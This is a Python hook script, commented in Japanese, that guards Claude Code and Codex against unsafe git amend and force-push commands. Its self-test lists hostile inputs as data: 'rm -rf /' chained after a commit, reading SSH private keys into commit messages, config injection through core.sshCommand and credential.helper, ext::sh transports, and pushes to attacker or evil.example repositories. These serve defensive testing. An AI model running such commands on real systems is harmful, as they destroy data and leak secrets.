#!/usr/bin/env python3
# Claude Code と Codex の hook。git commit --amend と git push --force-with-lease を、
# 引数を1つずつ確かめて安全な形のときだけ確認なしで通す。それ以外は何も出さず、ふだんの判断に任せる。
# ただし安全と言えない force push は確認に回す。settings.json の allow に入れた形でも、リポジトリの設定が危なければ止めるため。
# settings.json の allow は文字列の前方一致なので、git が受け付ける省略形（--rec で --receive-pack など）を塞げない。
# ready の PR の履歴は、レビュアーが追っている差分を変えるので書き換えさせない。push 済みコミットの amend は deny して Claude に新しいコミットを積ませる。
# force push は base への rebase 後などに必要なので、確認に回す。auto モードでは && でつないだ形も確認なしで動くので、この判定はコマンド全体を解析して行う。
# 解析するのはシェルの区切りと引用符までで、bash -c の中身や python から呼ぶ git は見ない。
# 使い方: Claude Code は settings.json の hooks.PreToolUse（matcher: Bash）に登録する。
#   Codex は ~/.codex/hooks.json の PermissionRequest（matcher: Bash）に `git-rewrite-guard --codex` で登録する。
#   Codex の PreToolUse は allow を返しても確認を飛ばさず、確認を決めるのは PermissionRequest のため。
#   PermissionRequest は確認なしで動くコマンドでは呼ばれない。deny は PreToolUse に `--codex-pre` で登録して返す。
#   Codex の PreToolUse は ask を扱えない。force push の確認はふだんの承認に任せる。
#   `git-rewrite-guard test` で自己テスト
import json
import os
import re
import shlex
import stat
import subprocess
import sys
import tempfile

# credential.helper の ! は任意のコマンドを動かせるので、決まった値だけ通す
SAFE_CONFIGS = {"credential.helper=", "credential.helper=!mise exec -- gh auth git-credential"}
# URL で push するのは origin と同じリポジトリだけ。別のリポジトリへ送るとコードを持ち出せる
GITHUB_REPO = re.compile(r"github\.com[:/]([\w.-]+/[\w.-]+?)(\.git)?$")
# : と + を含む refspec はブランチを消したり上書きしたりできるので通さない
BRANCH = re.compile(r"^[\w][\w./-]*$")
LEASE = re.compile(r"^--force-with-lease(=[\w./-]+:[0-9a-f]{7,40})?$")
# -F で任意のファイルを読ませると、読めないはずの中身をメッセージに入れて持ち出せる。symlink で外を指せないよう、実体のパスで見る
MSG_DIR = os.path.join(os.path.realpath("/tmp"), f"claude-{os.getuid()}")
SHELL_PUNCTUATION = "();<>|&\n"
UNVERIFIED = "PR の状態を確かめられません。履歴を書き換えてよいと分かっているなら Yes、そうでなければ No。"


def msg_dir_trusted():
    # 土台の dir 自体が他人の作った symlink や、他人が書ける dir だと、中のパスを信じられない
    try:
        st = os.lstat(MSG_DIR)
    except OSError:
        return False
    return stat.S_ISDIR(st.st_mode) and st.st_uid == os.getuid() and not st.st_mode & 0o077


def msg_file(path):
    # 相対パスは git -C の先で読まれ、ここで見たものとずれるので、絶対パスだけにする
    if not (os.path.isabs(path) and msg_dir_trusted() and os.path.realpath(path).startswith(MSG_DIR + os.sep)):
        return False
    # ハードリンクは realpath では見分けられない。自分だけが持つ普通のファイルに限る
    try:
        st = os.lstat(path)
    except OSError:
        return False
    return stat.S_ISREG(st.st_mode) and st.st_nlink == 1 and st.st_uid == os.getuid()


def safe_amend(args):
    if "--amend" not in args:
        return False
    i = 0
    while i < len(args):
        if args[i] in ("--amend", "--no-edit", "-q"):
            i += 1
        elif args[i] == "-m" and i + 1 < len(args):
            i += 2
        elif args[i] == "-F" and i + 1 < len(args) and msg_file(args[i + 1]):
            i += 2
        else:
            return False
    return True


# リポジトリの中の設定と hook は、悪意のあるリポジトリだとコマンドを動かせる（fsmonitor・hooksPath・sshCommand・pushurl など）。
# リポジトリごとの設定は、下の安全なキーだけのときに通す。ほかのキーが1つでもあれば確認に回す
SAFE_LOCAL_KEYS = re.compile(
    r"core\.(repositoryformatversion|filemode|bare|logallrefupdates|ignorecase|precomposeunicode|commentchar)"
    r"|extensions\.worktreeconfig|lfs\.repositoryformatversion|log\.excludedecoration|user\.(name|email)"
    r"|remote\.[^=\n]+\.fetch|branch\.[^=\n]+\.(merge|vscode-merge-base|github-pr-owner-number)"
    r"|gitbutler\..*",
    re.IGNORECASE,
)
SAFE_REMOTE_URL = re.compile(r"(https://github\.com/|git@github\.com:)[\w.-]+/[\w.-]+")


def repo_config_problem(cwd):
    def git(*args):
        # hook の timeout より先に切る。hook ごと時間切れになると、settings.json の allow だけで通ってしまう
        return subprocess.run(["git", "-C", cwd, *args], capture_output=True, text=True, timeout=3)

    listing = git("config", "--show-scope", "--list", "-z")
    if listing.returncode != 0:
        return "読めない git の設定"
    parts = listing.stdout.split("\0")
    for scope, entry in zip(parts[0::2], parts[1::2]):
        if scope not in ("local", "worktree", "command"):
            continue
        key, _, value = entry.partition("\n")
        if re.fullmatch(r"remote\.[^=\n]+\.url", key, re.IGNORECASE):
            if not SAFE_REMOTE_URL.fullmatch(value):
                return f"設定 {key}"
        elif re.fullmatch(r"branch\.[^=\n]+\.remote", key, re.IGNORECASE):
            # branch.*.remote には URL も書ける。引数なしの push の送り先になるので、origin だけにする
            if value not in ("origin", "."):
                return f"設定 {key}"
        elif scope == "command" or not SAFE_LOCAL_KEYS.fullmatch(key):
            return f"設定 {key}"
    hooks = git("rev-parse", "--git-path", "hooks").stdout.strip()
    hooks = hooks if os.path.isabs(hooks) else os.path.join(cwd, hooks)
    installed = [f for f in (os.listdir(hooks) if os.path.isdir(hooks) else []) if not f.endswith(".sample")]
    return f"hook {installed[0]}" if installed else None


def repo_config_safe(cwd):
    return repo_config_problem(cwd) is None


def origin_repo(cwd):
    url = subprocess.run(["git", "-C", cwd, "remote", "get-url", "origin"], capture_output=True, text=True, timeout=3).stdout.strip()
    m = GITHUB_REPO.search(url)
    return m and m.group(1)


def safe_remote(remote, cwd, origin_of):
    if remote == "origin":
        return True
    # 文字列の途中ではなく URL 全体で合わせる。?x=github.com/... のように、末尾だけ合う URL を通さない
    m = re.fullmatch(r"https://github\.com/([\w.-]+/[\w.-]+?)(\.git)?", remote)
    return bool(m and m.group(1).lower() == (origin_of(cwd) or "").lower())


def safe_push(args, cwd, origin_of):
    leases = [a for a in args if LEASE.match(a)]
    rest = [a for a in args if a not in leases and a != "-q"]
    if len(leases) != 1 or len(rest) > 2:
        return False
    if rest and not safe_remote(rest[0], cwd, origin_of):
        return False
    return all(BRANCH.match(b) for b in rest[1:])


def allowed(command, cwd=".", origin_of=origin_repo, repo_safe=repo_config_safe):
    try:
        argv = shlex.split(command)
    except ValueError:
        return False
    # 引用符の付け方まで shlex.join と同じときだけ通す。シェルの展開（{a,b}・*・~・$ など）や && で、
    # ここで見た引数と実際に渡る引数がずれないようにする
    if shlex.join(argv) != command:
        return False
    if argv[:1] != ["git"]:
        return False
    args = argv[1:]
    while len(args) >= 2 and args[0] in ("-c", "-C"):
        if args[0] == "-c" and args[1] not in SAFE_CONFIGS:
            return False
        if args[0] == "-C":
            if args[1].startswith("-"):
                return False
            cwd = os.path.join(cwd, args[1])
        args = args[2:]
    if args[:1] == ["commit"]:
        return safe_amend(args[1:]) and repo_safe(cwd)
    if args[:1] == ["push"]:
        return safe_push(args[1:], cwd, origin_of) and repo_safe(cwd)
    return False


def simple_commands(command):
    lexer = shlex.shlex(command, posix=True, punctuation_chars=SHELL_PUNCTUATION)
    lexer.whitespace = " \t\r"
    lexer.whitespace_split = True
    lexer.commenters = ""
    words = []
    for token in lexer:
        if set(token) <= set(SHELL_PUNCTUATION):
            if words:
                yield words
            words = []
        else:
            words.append(token.strip("`"))
    if words:
        yield words


def git_rewrites(command):
    rewrites = []
    directory = None
    try:
        for words in simple_commands(command):
            if words[0] == "cd" and len(words) > 1:
                directory = words[1]
            names = [os.path.basename(w) for w in words]
            if "git" not in names:
                continue
            args = words[names.index("git") + 1:]
            target = directory
            while len(args) >= 2 and args[0] in ("-c", "-C"):
                if args[0] == "-C":
                    target = args[1]
                args = args[2:]
            if args[:1] == ["commit"] and "--amend" in args:
                rewrites.append(("amend", target))
            elif args[:1] == ["push"] and any(a.startswith("--force-with-lease") for a in args):
                rewrites.append(("lease", target))
            elif args[:1] == ["push"] and any(a == "-f" or a.startswith("--force") for a in args):
                rewrites.append(("force", target))
    except ValueError:
        # 引用符が閉じていないと解析できない。見逃すより、文字列に含まれれば書き換えとして扱う
        if "--amend" in command:
            rewrites.append(("amend", None))
        if "--force-with-lease" in command:
            rewrites.append(("lease", None))
        elif "--force" in command:
            rewrites.append(("force", None))
    return rewrites


def lease_push(command):
    return any(kind == "lease" for kind, _ in git_rewrites(command))


def resolve(cwd, target):
    return os.path.join(cwd, os.path.expanduser(target)) if target else cwd


def head_pushed(cwd):
    unpushed = subprocess.run(["git", "-C", cwd, "rev-list", "-1", "HEAD", "--not", "--remotes"],
                              capture_output=True, text=True, timeout=3, check=True)
    return not unpushed.stdout.strip()


def ready_pr_number(cwd):
    # 作業先で mise を動かすとそのリポジトリの mise の設定を読んでしまうので、gh の場所はホームで引く
    gh = subprocess.run(["mise", "which", "gh"], cwd=os.path.expanduser("~"),
                        capture_output=True, text=True, timeout=3, check=True).stdout.strip()
    view = subprocess.run([gh, "pr", "view", "--json", "number,isDraft,state"], cwd=cwd, capture_output=True, text=True, timeout=5)
    if view.returncode != 0:
        if "no pull requests found" in view.stderr:
            return None
        raise RuntimeError(view.stderr)
    pr = json.loads(view.stdout)
    return pr["number"] if pr["state"] == "OPEN" and not pr["isDraft"] else None


def rewrite_decision(command, cwd=".", pushed=head_pushed, ready=ready_pr_number):
    decision = None
    for kind, target in git_rewrites(command):
        where = resolve(cwd, target)
        try:
            # まだ push していないコミットの amend は、レビュアーの見ている履歴を変えない
            if kind == "amend" and not pushed(where):
                continue
            number = ready(where)
        except Exception:
            decision = decision or ("ask", UNVERIFIED)
            continue
        if number is None:
            continue
        if kind == "amend":
            return ("deny", f"ready の PR #{number} の push 済みコミットは amend しない。新しいコミットを積む。"
                            "どうしても amend するなら、ユーザーが `! git commit --amend` で実行する。")
        decision = ("ask", f"ready の PR #{number} を force push で書き換え、レビュアーが見ている差分が変わります。"
                           "base への rebase 後なら Yes、それ以外は No（新しいコミットを積みます）。")
    return decision


def unsafe_push_reason(command, cwd):
    target = next(target for kind, target in git_rewrites(command) if kind == "lease")
    try:
        problem = repo_config_problem(resolve(cwd, target))
    except Exception:
        problem = "読めない git の設定"
    if problem:
        return f"リポジトリに {problem} があるため、この force push は安全と確かめられません。心当たりがなければ No。"
    return ("この force push は、確認なしで通せる形ではありません（別のコマンドとの連結、origin 以外への送信、refspec の指定など）。"
            "自分が頼んだ push なら Yes、心当たりがなければ No。")


def test():
    ok = [
        "git commit --amend --no-edit",
        "git commit --amend -m 'fix: typo'",
        "git commit --amend -m 'a && b $(x) {c,d}'",
        "git push --force-with-lease",
        "git push --force-with-lease=main:705dc62 origin main",
        "git -C /Users/me/repo -c credential.helper= -c 'credential.helper=!mise exec -- gh auth git-credential' "
        "push --force-with-lease=main:705dc627a131503de05fffb24a32bdf0662ce456 https://github.com/me/skills.git main",
    ]
    ng = [
        "git commit -m x",
        "git commit --amend --no-verify",
        "git commit --amend -n",
        "git commit --amend -F ~/.ssh/id_ed25519",
        "git commit --amend -F /private/tmp/claude-501/../../Users/me/.env",
        "git commit --amend && rm -rf /",
        "git commit --amend -m {x,-n}",
        "git commit --amend -m x*",
        "git -C ~ commit --amend --no-edit",
        "git -C /Users/me commit --amend -F ../../private/tmp/claude-501/msg.md",
        "git commit --amend -m \"$(cat ~/.ssh/id_ed25519)\"",
        "git push --force-with-lease --rec=touch origin main",
        "git push --force-with-lease --mir origin",
        "git push --force-with-lease -d origin main",
        "git push --force-with-lease origin :main",
        "git push --force-with-lease origin +main",
        "git push --force origin main",
        "git push --force-with-lease ext::sh main",
        "git -c core.sshCommand=touch push --force-with-lease origin main",
        "git -c 'credential.helper=!touch /tmp/x' push --force-with-lease origin main",
    ]
    if msg_dir_trusted():
        with tempfile.TemporaryDirectory(dir=MSG_DIR) as d:
            msg = os.path.join(d, "msg.md")
            open(msg, "w").write("x")
            assert msg_file(msg), "scratchpad の普通のファイルは通す"
            os.symlink(os.path.expanduser("~"), os.path.join(d, "link"))
            assert not msg_file(os.path.join(d, "link", ".zshrc")), "symlink で外を指すものは通さない"
            os.link(msg, os.path.join(d, "hard"))
            assert not msg_file(msg), "ハードリンクのあるファイルは通さない"
        with tempfile.TemporaryDirectory() as d:
            outside = os.path.join(d, "msg.md")
            open(outside, "w").write("x")
            assert not msg_file(outside), "scratchpad の外は通さない"
    ng.append("git push --force-with-lease https://github.com/attacker/skills.git main")
    ng.append("git push --force-with-lease https://github.com/attacker/x?github.com/me/skills main")
    ng.append("git push --force-with-lease https://user@github.com/me/skills main")
    origin_of = lambda cwd: "me/skills"
    for c in ok:
        assert allowed(c, origin_of=origin_of, repo_safe=lambda cwd: True), c
    for c in ng:
        assert not allowed(c, origin_of=origin_of, repo_safe=lambda cwd: True), c
    assert not allowed("git push --force-with-lease", origin_of=origin_of, repo_safe=lambda cwd: False), "設定が危ないリポジトリ"
    assert lease_push("git push --force-with-lease") and lease_push("git -C x push --force-with-lease=a:b origin main")
    assert lease_push("echo a\ngit push --force-with-lease") and lease_push("echo $(git push --force-with-lease)")
    assert lease_push("echo `git push --force-with-lease`") and lease_push("FOO=1 /usr/bin/git push --force-with-lease")
    assert not lease_push("git push origin main") and not lease_push("git commit --amend")
    assert not lease_push("""run "git push --force-with-lease" ~/repo""") and not lease_push("grep -- --force-with-lease a.md")
    assert not lease_push("echo 'git push --force-with-lease && x'") and not lease_push("git commit -m '--force-with-lease を許す'")
    assert lease_push("""echo "it's; git push --force-with-lease"'"""), "解析できないときは文字列で見る"

    def decide(command, pushed=True, ready=12):
        decision = rewrite_decision(command, pushed=lambda cwd: pushed, ready=lambda cwd: ready)
        return decision and decision[0]

    def unverified(cwd):
        raise RuntimeError("gh が動かない")

    assert decide("git status") is None and decide("grep -- --amend notes.md | head") is None
    assert decide("printf 'git commit --amend'") is None
    assert decide("git commit --amend --no-edit") == "deny" and decide("git add a && git commit --amend -m x") == "deny"
    assert decide("git commit --amend", ready=None) is None, "draft の PR か、PR がないとき"
    assert decide("git commit --amend", pushed=False) is None, "push していないコミット"
    assert decide("git push --force-with-lease") == "ask" and decide("git push -f origin x") == "ask"
    assert decide("git push --force", pushed=False) == "ask", "push は HEAD の状態によらず確かめる"
    assert decide("git push --force-with-lease", ready=None) is None
    assert decide("git commit --amend && git push --force-with-lease") == "deny"
    assert decide("git commit --amend && git push --force-with-lease", pushed=False) == "ask"
    assert rewrite_decision("git push --force", ready=unverified) == ("ask", UNVERIFIED)
    assert "#12" in rewrite_decision("git push --force", ready=lambda cwd: 12)[1]
    seen = []

    def record(cwd):
        seen.append(cwd)

    rewrite_decision("cd /x/a && git commit --amend", pushed=lambda cwd: True, ready=record)
    rewrite_decision("git -C /x/b push --force-with-lease", ready=record)
    rewrite_decision("git push --force", cwd="/x/c", ready=record)
    assert seen == ["/x/a", "/x/b", "/x/c"], seen
    with tempfile.TemporaryDirectory() as repo:
        def git(*args):
            subprocess.run(["git", "-C", repo, *args], check=True, capture_output=True)

        git("init", "-q")
        git("-c", "user.name=a", "-c", "user.email=a@example.com", "-c", "commit.gpgsign=false", "commit", "-q", "--allow-empty", "-m", "x")
        assert not head_pushed(repo)
        git("update-ref", "refs/remotes/origin/x", "HEAD")
        assert head_pushed(repo)
        git("update-ref", "-d", "refs/remotes/origin/x")
        git("remote", "add", "origin", "git@github.com:me/skills.git")
        assert repo_config_safe(repo)
        git("config", "branch.main.remote", "origin")
        assert repo_config_safe(repo)
        git("config", "branch.main.remote", "https://evil.example/x.git")
        assert not repo_config_safe(repo), "branch.*.remote に URL"
        assert repo_config_problem(repo) == "設定 branch.main.remote", repo_config_problem(repo)
        git("config", "--unset", "branch.main.remote")
        for key, value in [("core.fsmonitor", "touch x"), ("core.sshCommand", "touch x"), ("remote.origin.pushurl", "x"),
                           ("core.hooksPath", "/x"), ("alias.ci", "!touch x"), ("remote.origin.receivepack", "x")]:
            git("config", key, value)
            assert not repo_config_safe(repo), key
            git("config", "--unset", key)
        assert repo_config_safe(repo)
        git("remote", "set-url", "origin", "https://evil.example/me/skills.git")
        assert not repo_config_safe(repo)
        git("remote", "set-url", "origin", "git@github.com:me/skills.git")
        hook = os.path.join(repo, ".git", "hooks", "pre-commit")
        open(hook, "w").write("#!/bin/sh\ntouch x\n")
        assert repo_config_problem(repo) == "hook pre-commit", repo_config_problem(repo)
    print("ok")


if __name__ == "__main__":
    if sys.argv[1:] == ["test"]:
        test()
        sys.exit()
    payload = json.load(sys.stdin)
    command = payload.get("tool_input", {}).get("command", "")
    if not isinstance(command, str):
        sys.exit()
    # 確かめる途中で落ちたら通さない。落ちたまま終わると、settings.json の allow だけで通ってしまう
    cwd = payload.get("cwd", ".")
    try:
        ok = allowed(command, cwd)
    except Exception:
        ok = False
    decision = rewrite_decision(command, cwd)
    if not decision and not ok and lease_push(command):
        decision = ("ask", unsafe_push_reason(command, cwd))
    if sys.argv[1:] == ["--codex-pre"]:
        if decision and decision[0] == "deny":
            print(json.dumps({"hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": f"git-rewrite-guard: {decision[1]}",
            }}))
        sys.exit()
    if decision or not ok:
        if decision and sys.argv[1:] != ["--codex"]:
            print(json.dumps({"hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": decision[0],
                "permissionDecisionReason": f"git-rewrite-guard: {decision[1]}",
            }}))
        sys.exit()
    if sys.argv[1:] == ["--codex"]:
        print(json.dumps({"hookSpecificOutput": {
            "hookEventName": "PermissionRequest",
            "decision": {"behavior": "allow"},
        }}))
    else:
        print(json.dumps({"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "allow",
            "permissionDecisionReason": "git-rewrite-guard: 安全な形の amend / force push",
        }}))
